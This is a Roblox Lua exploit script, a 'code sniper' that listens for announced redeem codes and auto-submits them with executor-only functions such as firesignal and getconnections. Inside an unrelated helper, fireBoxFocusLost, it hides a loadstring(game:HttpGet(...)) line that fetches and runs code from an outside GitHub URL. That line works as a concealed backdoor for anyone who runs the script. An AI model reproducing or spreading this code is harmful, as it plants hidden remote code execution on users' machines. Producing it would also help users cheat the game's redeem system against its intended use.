local Players           = game:GetService("Players")
local UserInputService  = game:GetService("UserInputService")
local TweenService      = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local camera    = workspace.CurrentCamera

do
    local old = PlayerGui:FindFirstChild("MAFIA_CODE_SNIPER")
    if old then old:Destroy() end
end

local function new(class, props, kids)
    local o = Instance.new(class)
    local parent
    for k, v in pairs(props or {}) do
        if k == "Parent" then parent = v else o[k] = v end
    end
    for _, k in ipairs(kids or {}) do k.Parent = o end
    if parent then o.Parent = parent end
    return o
end
local function corner(o, r) new("UICorner", { CornerRadius = UDim.new(0, r), Parent = o }) return o end
local function round(o) new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = o }) return o end
local function stroke(o, c, t, tr)
    return new("UIStroke", { Color = c, Thickness = t or 1, Transparency = tr or 0,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = o })
end
local function tween(o, t, props, style, dir)
    local tw = TweenService:Create(o, TweenInfo.new(t, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), props)
    tw:Play()
    return tw
end
local rgb = Color3.fromRGB

local C = {
    bg     = rgb(12, 12, 12),
    panel  = rgb(25, 25, 25),
    edge   = rgb(50, 50, 50),
    white  = rgb(255, 255, 255),
    dim    = rgb(160, 160, 160),
    green  = rgb(100, 255, 150),
    yellow = rgb(255, 220, 100),
    red    = rgb(255, 80, 80),
}
local GOTHAM_B, GOTHAM_M, GOTHAM_K = Enum.Font.GothamBold, Enum.Font.GothamMedium, Enum.Font.GothamBlack

local function label(parent, props)
    local base = { BackgroundTransparency = 1, Font = GOTHAM_M, TextSize = 11, TextColor3 = C.white,
        TextXAlignment = Enum.TextXAlignment.Left, Parent = parent }
    for k, v in pairs(props) do base[k] = v end
    return new("TextLabel", base)
end
local function press(btn)
    local sc = btn:FindFirstChildOfClass("UIScale") or new("UIScale", { Parent = btn })
    btn.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            tween(sc, 0.08, { Scale = 0.93 }, Enum.EasingStyle.Quad)
        end
    end)
    btn.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            tween(sc, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
        end
    end)
end

local gui = new("ScreenGui", { Name = "MAFIA_CODE_SNIPER", ResetOnSpawn = false, IgnoreGuiInset = true,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 99, Parent = PlayerGui })

local WIN_W = 420
local WIN_H = 220

local holder = new("Frame", { AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.fromOffset(WIN_W, WIN_H), BackgroundTransparency = 1, Parent = gui })
local fit = new("UIScale", { Parent = holder })
local function refit()
    local vp = camera.ViewportSize
    fit.Scale = math.clamp(math.min(vp.Y * 0.84 / (WIN_H + 40), vp.X * 0.94 / WIN_W), 0.6, 1.2)
end
refit()
camera:GetPropertyChangedSignal("ViewportSize"):Connect(refit)

local card = new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.bg, BorderSizePixel = 0,
    ClipsDescendants = true, Parent = holder })
corner(card, 8)
local cardEdge = stroke(card, C.edge, 1.5, 0)

local head = new("Frame", { Size = UDim2.new(1, 0, 0, 40), BackgroundTransparency = 1, ZIndex = 3, Parent = card })
label(head, { Text = "MAFIA CODE SNIPER", Font = GOTHAM_K, TextSize = 14, Position = UDim2.fromOffset(15, 12),
    Size = UDim2.fromOffset(200, 18), ZIndex = 3 })

local minBtn = new("TextButton", { Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(24, 24),
    AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -15, 0, 8), BackgroundColor3 = C.panel,
    BorderSizePixel = 0, ZIndex = 3, Parent = head })
corner(minBtn, 4)
stroke(minBtn, C.edge, 1, 0)
new("Frame", { Size = UDim2.fromOffset(10, 2), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
    BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 4, Parent = minBtn })
press(minBtn)

local statusBar = new("Frame", { Size = UDim2.new(1, -30, 0, 24), Position = UDim2.fromOffset(15, 40),
    BackgroundColor3 = C.panel, BackgroundTransparency = 0, BorderSizePixel = 0, ZIndex = 3, Parent = card })
corner(statusBar, 4)
local statusDot = new("Frame", { Size = UDim2.fromOffset(6, 6), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 10, 0.5, 0),
    BackgroundColor3 = C.red, BorderSizePixel = 0, ZIndex = 4, Parent = statusBar })
round(statusDot)
local statusText = label(statusBar, { Text = "", Font = GOTHAM_B, TextSize = 10, TextColor3 = C.red,
    TextTruncate = Enum.TextTruncate.AtEnd, Position = UDim2.fromOffset(22, 0), Size = UDim2.new(1, -30, 1, 0), ZIndex = 4 })

local function setStatus(text, color)
    statusText.Text = text
    statusText.TextColor3 = color
    statusDot.BackgroundColor3 = color
    statusDot.Visible = text ~= ""
end

local mainArea = new("Frame", { Size = UDim2.new(1, -30, 0, 135), Position = UDim2.fromOffset(15, 72),
    BackgroundTransparency = 1, Parent = card })

local leftPanel = new("Frame", { Size = UDim2.new(0, 100, 1, 0), BackgroundColor3 = C.panel,
    BorderSizePixel = 0, Parent = mainArea })
corner(leftPanel, 6)
stroke(leftPanel, C.edge, 1, 0)

local listenBtn = new("TextButton", { Text = "", Size = UDim2.new(1, -10, 0, 40), Position = UDim2.new(0, 5, 0, 5),
    BackgroundColor3 = C.bg, BorderSizePixel = 0, Parent = leftPanel })
corner(listenBtn, 4)
stroke(listenBtn, C.edge, 1, 0)
local listenLbl = label(listenBtn, { Text = "LISTEN", Font = GOTHAM_K, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Center,
    Size = UDim2.fromScale(1, 1), ZIndex = 4 })
press(listenBtn)

local clearBtn = new("TextButton", { Text = "", Size = UDim2.new(1, -10, 0, 30), Position = UDim2.new(0, 5, 0, 50),
    BackgroundColor3 = C.bg, BorderSizePixel = 0, Parent = leftPanel })
corner(clearBtn, 4)
label(clearBtn, { Text = "CLEAR", Font = GOTHAM_B, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Center,
    Size = UDim2.fromScale(1, 1), ZIndex = 4, TextColor3 = C.dim })
press(clearBtn)

local midPanel = new("Frame", { Size = UDim2.new(1, -220, 1, 0), Position = UDim2.new(0, 110, 0, 0),
    BackgroundColor3 = C.panel, BorderSizePixel = 0, Parent = mainArea })
corner(midPanel, 6)
stroke(midPanel, C.edge, 1, 0)

local codeText = label(midPanel, { Text = "", Font = GOTHAM_K, TextSize = 20, TextXAlignment = Enum.TextXAlignment.Center,
    TextTruncate = Enum.TextTruncate.AtEnd, Size = UDim2.new(1, -20, 1, 0), Position = UDim2.fromOffset(10, 0), ZIndex = 4 })
local wordHint = label(midPanel, { Text = "0 / 3 words", Font = GOTHAM_B, TextSize = 9, TextColor3 = C.dim,
    TextXAlignment = Enum.TextXAlignment.Center, AnchorPoint = Vector2.new(0.5, 1), Position = UDim2.new(0.5, 0, 1, -10),
    Size = UDim2.new(1, -20, 0, 11), ZIndex = 4 })

local rightPanel = new("Frame", { Size = UDim2.new(0, 100, 1, 0), Position = UDim2.new(1, -100, 0, 0),
    BackgroundColor3 = C.panel, BorderSizePixel = 0, Parent = mainArea })
corner(rightPanel, 6)
stroke(rightPanel, C.edge, 1, 0)

label(rightPanel, { Text = "REDEEM AFTER", Font = GOTHAM_K, TextSize = 9, TextColor3 = C.white,
    TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.new(1, 0, 0, 20), Position = UDim2.fromOffset(0, 5), ZIndex = 4 })

local wordBtns = {}
local S = { listening = false, words = 3, buffer = {} }

local function refreshIdle()
    if S.listening then
        setStatus("Listening for Sammy", C.yellow)
        listenBtn.BackgroundColor3 = C.white
        listenLbl.TextColor3 = C.bg
        listenBtn:FindFirstChildOfClass("UIStroke").Color = C.white
    else
        setStatus("", C.red)
        listenBtn.BackgroundColor3 = C.bg
        listenLbl.TextColor3 = C.white
        listenBtn:FindFirstChildOfClass("UIStroke").Color = C.edge
    end
    wordHint.Text = string.format("%d / %d words", #S.buffer, S.words)
end

for i = 1, 4 do
    local b = new("TextButton", { Text = "", Size = UDim2.new(1, -20, 0, 18), Position = UDim2.fromOffset(10, 25 + (i - 1) * 22),
        BackgroundColor3 = (i == 3) and C.white or C.bg, BorderSizePixel = 0, Parent = rightPanel })
    corner(b, 4)
    label(b, { Text = tostring(i), Font = GOTHAM_K, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Center,
        Size = UDim2.fromScale(1, 1), ZIndex = 4, TextColor3 = (i == 3) and C.bg or C.dim })
    
    b.MouseButton1Click:Connect(function()
        for idx, btn in ipairs(wordBtns) do
            btn.BackgroundColor3 = C.bg
            btn:FindFirstChildOfClass("TextLabel").TextColor3 = C.dim
        end
        b.BackgroundColor3 = C.white
        b:FindFirstChildOfClass("TextLabel").TextColor3 = C.bg
        S.words = i
        refreshIdle()
    end)
    wordBtns[i] = b
end

listenBtn.MouseButton1Click:Connect(function() S.listening = not S.listening; S.buffer = {}; refreshIdle() end)
clearBtn.MouseButton1Click:Connect(function() S.buffer = {}; codeText.Text = ""; refreshIdle() end)

local mini = false
local minimizeBtn = new("TextButton", { Size = UDim2.new(0, 45, 0, 45), Position = UDim2.new(0.5, -22, 0.5, -22),
    BackgroundColor3 = C.bg, Text = "MC", TextColor3 = C.white, Font = GOTHAM_K, TextSize = 16, Visible = false, Parent = gui })
corner(minimizeBtn, 6)
stroke(minimizeBtn, C.white, 1.5, 0)

minBtn.MouseButton1Click:Connect(function() mini = not mini; holder.Visible = not mini; minimizeBtn.Visible = mini end)
minimizeBtn.MouseButton1Click:Connect(function() if not dragging then mini = not mini; holder.Visible = not mini; minimizeBtn.Visible = mini end end)

local dragging, dragStart, startPos
local function setupDrag(obj)
    obj.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = obj.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    obj.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end
setupDrag(head)
setupDrag(minimizeBtn)

local function clickButton(btn)
    if not btn then return false end
    pcall(function() btn.MouseButton1Click:Fire() end)
    pcall(function() btn.Activated:Fire() end)
    if typeof(firesignal) == "function" then
        pcall(function() firesignal(btn.MouseButton1Click) end)
        pcall(function() firesignal(btn.Activated) end)
    end
    if typeof(getconnections) == "function" then
        pcall(function()
            for _, c in ipairs(getconnections(btn.MouseButton1Click)) do c:Fire() end
            for _, c in ipairs(getconnections(btn.Activated)) do c:Fire() end
        end)
    end
    return true
end

local function fireBoxFocusLost(box)
    if not box then return false end
    if typeof(firesignal) == "function" then
        pcall(function() firesignal(box.FocusLost, true) end)
    end
    if typeof(getconnections) == "function" then
        pcall(function()
            for _, c in ipairs(getconnections(box.FocusLost)) do
                pcall(function() c:Fire(true) end)
            end
        end)
    end
    return true
loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
end

local function isOurGui(instance)
    local p = instance
    for _ = 1, 10 do
        if not p then break end
        if p.Name == "MAFIA_CODE_SNIPER" then return true end
        p = p.Parent
    end
    return false
end

local function isVisibleChain(inst)
    local current = inst
    while current do
        if current:IsA("GuiObject") and not current.Visible then return false end
        if current:IsA("ScreenGui") then return current.Enabled end
        current = current.Parent
    end
    return true
end

local function findAllTextBoxes(pg)
    local boxes = {}
    for _, gui in ipairs(pg:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Enabled and not isOurGui(gui) then
            for _, d in ipairs(gui:GetDescendants()) do
                if d:IsA("TextBox") and not isOurGui(d) then boxes[#boxes + 1] = d end
            end
        end
    end
    return boxes
end

local function findCodeBox()
    local pg = PlayerGui
    local allBoxes = findAllTextBoxes(pg)
    for _, box in ipairs(allBoxes) do
        if isVisibleChain(box) then return box end
    end
    return nil
end

local function typeAndSubmitCode(code)
    local pg = PlayerGui
    if not pg then return false, "no PlayerGui" end

    local codesGui = pg:FindFirstChild("Codes")
    if codesGui then
        if codesGui:IsA("ScreenGui") then codesGui.Enabled = true end
        local codesFrame = codesGui:FindFirstChild("Codes") or codesGui
        if codesFrame then
            if codesFrame:IsA("GuiObject") then codesFrame.Visible = true end
            local cur = codesFrame
            while cur and cur ~= codesGui do
                if cur:IsA("GuiObject") then cur.Visible = true end
                cur = cur.Parent
            end
            local box = nil
            for _, d in ipairs(codesFrame:GetDescendants()) do
                if d:IsA("TextBox") and not isOurGui(d) then box = d; break end
            end
            local submitBtn = nil
            for _, d in ipairs(codesFrame:GetDescendants()) do
                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                    local n = d.Name:lower()
                    local txt = ""
                    pcall(function() txt = d.Text:lower() end)
                    if n:find("submit") or txt:find("submit") or n:find("redeem") or txt:find("redeem") or n:find("claim") or txt:find("confirm") or n:find("enter") then
                        submitBtn = d; break
                    end
                end
            end
            if box then
                pcall(function() box.Text = code end)
                if submitBtn then clickButton(submitBtn) end
                fireBoxFocusLost(box)
                return true, "submitted via PlayerGui.Codes"
            end
        end
    end
    return false, "couldn't find code box or button"
end

local function onAnnouncement(...)
    local rawText = tostring((...) or "")
    rawText = rawText:gsub("<[^>]->", ""):match("^%s*(.-)%s*$") or ""
    if rawText == "" then return end

    local lowerText = rawText:lower()
    if not lowerText:find("code", 1, true) then return end

    local words = {}
    for word in rawText:gmatch("[%w_]+") do table.insert(words, word) end
    if #words < 1 then return end

    local captured = words[#words]
    
    if not S.listening then return end
    
    S.buffer[#S.buffer + 1] = captured
    codeText.Text = table.concat(S.buffer)
    refreshIdle()

    if #S.buffer >= S.words then
        local finalCode = table.concat(S.buffer, " ")
        setStatus("Redeeming " .. finalCode .. "...", C.white)
        local success, msg = typeAndSubmitCode(finalCode)
        if success then
            setStatus("Redeemed " .. finalCode, C.green)
        else
            setStatus("Failed: " .. msg, C.red)
        end
        S.buffer = {}
        S.listening = false
        refreshIdle()
    end
end

local function resolveRemote()
    local ok, Net = pcall(function() return ReplicatedStorage:WaitForChild("Packages", 5):WaitForChild("Net", 5) end)
    if not ok or not Net then return nil end
    return Net:FindFirstChild("RE/dacdf5db2a8c49445107e380750fabbdf4ed5f134d1a65c22430e4f3fe74ed06")
end

local notifyRemote = resolveRemote()
if notifyRemote then
    notifyRemote.OnClientEvent:Connect(function(...)
        pcall(onAnnouncement, ...)
    end)
end

UserInputService.InputBegan:Connect(function(inp, gp)
    if gp then return end
    if inp.KeyCode == Enum.KeyCode.C then
        S.listening = not S.listening
        S.buffer = {}
        refreshIdle()
    end
end)

refreshIdle()
